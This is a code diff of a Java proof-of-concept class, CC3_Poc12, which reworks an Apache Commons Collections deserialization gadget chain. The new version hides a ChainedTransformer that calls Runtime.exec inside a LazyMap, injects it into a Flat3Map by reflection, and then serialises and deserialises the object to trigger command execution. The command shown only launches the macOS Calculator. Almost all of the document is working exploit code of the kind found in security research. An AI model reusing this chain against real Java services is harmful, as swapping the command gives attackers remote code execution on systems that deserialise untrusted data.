@@ -4,54 +4,62 @@ import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.Flat3Map;
 import org.apache.commons.collections.map.LazyMap;
+import ysoserial.payloads.util.Reflections;
 
-import javax.swing.text.html.CSS;
-import java.io.*;
-import java.lang.reflect.Field;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
 import java.util.HashMap;
 import java.util.Hashtable;
+import java.util.Map;
 
+/**
+ * <org.apache.commons.collections.map.Flat3Map: void readObject(java.io.ObjectInputStream)>
+ * -><org.apache.commons.collections.map.Flat3Map: java.lang.Object put(java.lang.Object,java.lang.Object)>
+ * -><java.util.Hashtable: boolean equals(java.lang.Object)>
+ * -><org.apache.commons.collections.map.LazyMap: java.lang.Object get(java.lang.Object)>
+ */
 public class CC3_Poc12 {
-    public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException {
-        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
+    public static void main(String[] args) throws Exception {
+
+        Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
-                new InvokerTransformer("getMethod", new Class[] {
-                        String.class, Class[].class }, new Object[] {
-                        "getRuntime", new Class[0] }),
-                new InvokerTransformer("invoke", new Class[] {
-                        Object.class, Object[].class }, new Object[] {
-                        null, new Object[0] }),
-                new InvokerTransformer("exec",
-                        new Class[] { String.class }, new Object[]{"" +
-                        "/Applications/Calculator.app/Contents/MacOS/Calculator"})});
-        HashMap innermap = new HashMap();
-        LazyMap outerMap = (LazyMap)LazyMap.decorate(innermap,chain);
-        TiedMapEntry tiedmap = new TiedMapEntry(outerMap,123);
-        Flat3Map flat3Map = new Flat3Map(outerMap);
-        flat3Map.put(tiedmap,"1");
-        outerMap.remove(123);
-        javax.swing.text.html.CSS css = new CSS();
-        Field field=css.getClass().getDeclaredField("valueConvertor");
-        field.setAccessible(true);//暴力反射
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+                new InvokerTransformer("exec", new Class[]{String.class},
+                        new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
+        };
+        Transformer transformerChain = new ChainedTransformer(transformers);
 
+        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
+        outerMap.put(333,333);
 
-        Hashtable hashtable = new Hashtable();
-        hashtable.put(flat3Map, flat3Map);
-        hashtable.put(flat3Map, 1);
-        hashtable.put(flat3Map, 2);
-        hashtable.put(flat3Map, 3);
-        field.set(css,hashtable);
+        Hashtable hashtable =new Hashtable();
+        hashtable.put(111,1111);
+
+        Hashtable hashtable1 = new Hashtable();
+        hashtable1.put(222,222);
+
+        Flat3Map flat3Map = new Flat3Map();
+        flat3Map.put(1,1);
+        flat3Map.put(2,2);
+        flat3Map.put(3,3);
+        Reflections.setDeclaredField(flat3Map,"key1",outerMap);
+        Reflections.setDeclaredField(flat3Map,"key2",hashtable);
+        Reflections.setDeclaredField(flat3Map,"key3",hashtable1);
+
+        //         serialise
         ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccf3"));
-        outputStream.writeObject(css);
+        outputStream.writeObject(flat3Map);
         outputStream.close();
 
 
+//        //        deserialize
         ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccf3"));
         inputStream.readObject();
-
-
     }
 }
